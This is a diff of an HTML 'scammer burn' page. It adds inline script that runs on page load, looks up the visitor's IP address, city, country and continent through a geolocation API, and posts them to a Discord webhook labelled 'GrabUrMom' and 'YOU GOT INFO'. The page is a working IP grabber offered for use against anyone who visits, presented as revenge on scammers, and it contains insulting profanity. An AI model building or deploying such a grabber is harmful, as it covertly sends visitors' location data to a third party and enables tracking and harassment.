@@ -1,11 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Fuck You, Scammers</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation & Scammer Burn</title>
     <style>
         body {
             background-color: #111;
@@ -45,7 +44,20 @@
         a:hover {
             text-shadow: 0 0 10px lime;
         }
+        #geo-info {
+            margin-top: 40px;
+            font-size: 1.2rem;
+            color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 20px;
+            background-color: rgba(0, 128, 0, 0.1);
+        }
+        #geo-info h2 {
+            color: #0f0;
+        }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> <!-- Include jQuery -->
 </head>
 <body>
     <h1>Fuck You, Scammers</h1>
@@ -55,14 +67,49 @@
     <p>Need advice on your next scam? Sure:</p>
     <a href="https://www.google.com/search?q=how+to+stop+being+a+worthless+scammer" target="_blank">Click Here, Dumbass</a>
 
+    <!-- Geolocation Info Section -->
+    <div id="geo-info">
+        <h2>Geolocation Info:</h2>
+        <p><strong>IP:</strong> <span id="ip"></span></p>
+        <p><strong>City:</strong> <span id="city"></span></p>
+        <p><strong>Country:</strong> <span id="country"></span></p>
+        <p><strong>Continent:</strong> <span id="continent"></span></p>
+    </div>
+
     <script>
-        // Replace with your backend URL for logging the IP
-        fetch('https://your-backend-url.com/log-ip')  // Make sure this is the actual backend URL
-            .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Error logging IP:', error));
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> <!-- Include jQuery -->
-    <script src="grab.js"></script> <!-- Link to your grab.js file -->
+        // Geolocation script (grab.js functionality inline)
+        $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY", function(data) {
+            // Populate the geolocation info section
+            $('#ip').text(data.ip_address || "Unavailable");
+            $('#city').text(data.city || "Unavailable");
+            $('#country').text(data.country || "Unavailable");
+            $('#continent').text(data.continent || "Unavailable");
+
+            // Send the data to Discord webhook (optional)
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/WEBHOOK_URL");
+            request.setRequestHeader('Content-type', 'application/json');
+            var payload = {
+                username: "GrabUrMom",
+                avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
+                embeds: [{
+                    color: "4700374",
+                    title: "YOU GOT INFO",
+                    fields: [
+                        {name: "IP", value: data.ip_address || "Unavailable"},
+                        {name: "CITY", value: data.city || "Unavailable"},
+                        {name: "COUNTRY", value: data.country || "Unavailable"},
+                        {name: "CONTINENT", value: data.continent || "Unavailable"}
+                    ],
+                    footer: {
+                        text: "By KazUpTV"
+                    }
+                }]
+            };
+            request.send(JSON.stringify(payload));
+        }).fail(function() {
+            console.error("Failed to fetch geolocation data.");
+        });
     </script>
 </body>
 </html>
